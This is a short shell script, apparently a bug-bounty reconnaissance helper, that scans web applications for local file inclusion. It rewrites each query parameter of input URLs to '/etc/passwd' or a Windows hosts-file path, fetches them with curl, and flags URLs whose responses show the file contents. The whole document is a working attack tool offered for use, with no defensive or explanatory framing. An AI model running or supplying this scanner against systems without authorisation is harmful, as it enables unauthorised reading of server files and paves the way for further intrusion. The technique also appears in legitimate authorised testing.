#!/bin/sh

while read -r input;
do
    for URL in `echo "$input" | ./qsreplace "/etc/passwd"` ;
    do
        curl -s $URL 2>&1 | grep -q "root:x" && echo "LFI $URL"
    done

    for URL in `echo "$input" | ./qsreplace "\Windows\System32\Drivers\etc\hosts"` ;
    do
        curl -s $URL 2>&1 | grep -q "127.0.0.1" && echo "LFI $URL"
    done

done
